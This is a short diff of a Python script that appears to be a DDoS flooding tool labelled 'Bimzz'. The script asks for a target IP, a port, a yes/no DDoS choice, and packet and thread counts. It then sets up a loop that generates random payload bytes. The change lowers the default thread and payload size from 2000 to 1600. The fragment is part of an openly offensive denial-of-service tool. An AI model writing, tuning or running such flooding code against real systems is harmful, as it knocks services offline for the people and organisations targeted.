@@ -36,9 +36,9 @@ ip = str(input(" Bimzz | Ip:"))
 port = int(input(" Bimzz | Port:"))
 choice = str(input(" Bimzz | Ddos Gak?(y/n):"))
 times = int(input(" Bimzz | Packets(2000):"))
-threads = int(input(" Bimzz | Threads(2000):"))
+threads = int(input(" Bimzz | Threads(1600):"))
 def run():
-	data = random._urandom(2000)
+	data = random._urandom(1600)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
